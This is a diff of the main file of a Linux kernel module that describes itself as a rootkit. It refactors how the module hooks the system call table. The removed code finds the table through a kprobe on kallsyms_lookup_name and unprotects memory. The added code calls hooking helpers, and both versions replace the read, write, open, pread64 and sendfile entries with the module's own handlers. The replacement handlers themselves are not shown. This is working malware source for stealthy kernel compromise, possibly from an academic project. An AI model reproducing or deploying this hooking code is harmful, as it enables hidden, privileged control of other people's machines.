@@ -1,24 +1,21 @@
-#include <linux/fs.h>
 #include <linux/init.h>
 #include <linux/ioctl.h>
-#include <linux/kprobes.h>
 #include <linux/linkage.h>
 #include <linux/miscdevice.h>
+#include <linux/mm.h>
 #include <linux/module.h>
 #include <linux/slab.h>
 #include <linux/types.h>
 #include <linux/uaccess.h>
 
 #include "rootkit-main.h"
-#include "mem-protect.h"
+#include "hooking.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
 MODULE_DESCRIPTION("A Linux kernel rootkit");
 MODULE_VERSION("0.1");
 
-static kallsyms_t lookup_name;
-static uint64_t *p_syscall_table;
 static sysfun_t orig_read;
 static sysfun_t orig_write;
 static sysfun_t orig_open;
@@ -30,64 +27,38 @@ static sysfun_t orig_sendfile;
 static int __init rootkit_init(void)
 {
 	int i_err;
-	unsigned long ul_orig_cr0;
 
-	// Declare what we need to find
-	struct kprobe probe = {
-		.symbol_name = KALLSYMS_NAME,
-	};
+	// Initialize hooking
+	i_err = init_hooking();
 
-	i_err = register_kprobe(&probe);
 	if (i_err) {
-		pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.");
-
+		pr_err("[ROOTKIT] Failed to initialize hooking");
 		return i_err;
 	}
 
-	// Function pointer type of kallsyms_lookup_name()
-	lookup_name = (kallsyms_t)(probe.addr);
-
-	// Cleanup kprobe as we don't need it anymore
-	unregister_kprobe(&probe);
-
-	// Find syscall table address
-	p_syscall_table = lookup_name(SYS_CALL_TABLE_NAME);
-
-	ul_orig_cr0 = unprotect_memory();
-
-	orig_read = (sysfun_t)p_syscall_table[__NR_read];
-	p_syscall_table[__NR_read] = (uint64_t)new_read;
-	orig_write = (sysfun_t)p_syscall_table[__NR_write];
-	p_syscall_table[__NR_write] = (uint64_t)new_write;
-	orig_open = (sysfun_t)p_syscall_table[__NR_open];
-	p_syscall_table[__NR_open] = (uint64_t)new_open;
-	orig_pread64 = (sysfun_t)p_syscall_table[__NR_pread64];
-	p_syscall_table[__NR_pread64] = (uint64_t)new_pread64;
-	orig_sendfile = (sysfun_t)p_syscall_table[__NR_sendfile];
-	p_syscall_table[__NR_sendfile] = (uint64_t)new_sendfile;
-
-	protect_memory(ul_orig_cr0);
+	orig_read = get_syscall_entry(__NR_read);
+	set_syscall_entry(__NR_read, new_read);
+	orig_write = get_syscall_entry(__NR_write);
+	set_syscall_entry(__NR_write, new_write);
+	orig_open = get_syscall_entry(__NR_open);
+	set_syscall_entry(__NR_open, new_open);
+	orig_pread64 = get_syscall_entry(__NR_pread64);
+	set_syscall_entry(__NR_pread64, new_pread64);
+	orig_sendfile = get_syscall_entry(__NR_sendfile);
+	set_syscall_entry(__NR_sendfile, new_sendfile);
 
 	pr_info("[ROOTKIT] Module loaded");
-	pr_info("[ROOTKIT] kallsym_lookup_name() address: %p", lookup_name);
-	pr_info("[ROOTKIT] Syscall table address: %p", p_syscall_table);
 	return 0;
 }
 
 static __exit void rootkit_exit(void)
 {
-	unsigned long ul_orig_cr0;
-
 	// Restore original syscall functions
-	ul_orig_cr0 = unprotect_memory();
-
-	p_syscall_table[__NR_read] = (uint64_t)orig_read;
-	p_syscall_table[__NR_write] = (uint64_t)orig_write;
-	p_syscall_table[__NR_open] = (uint64_t)orig_open;
-	p_syscall_table[__NR_pread64] = (uint64_t)orig_pread64;
-	p_syscall_table[__NR_sendfile] = (uint64_t)orig_sendfile;
-
-	protect_memory(ul_orig_cr0);
+	set_syscall_entry(__NR_read, orig_read);
+	set_syscall_entry(__NR_write, orig_write);
+	set_syscall_entry(__NR_open, orig_open);
+	set_syscall_entry(__NR_pread64, orig_pread64);
+	set_syscall_entry(__NR_sendfile, orig_sendfile);
 
 	pr_info("[ROOTKIT] Module unloaded");
 	return;
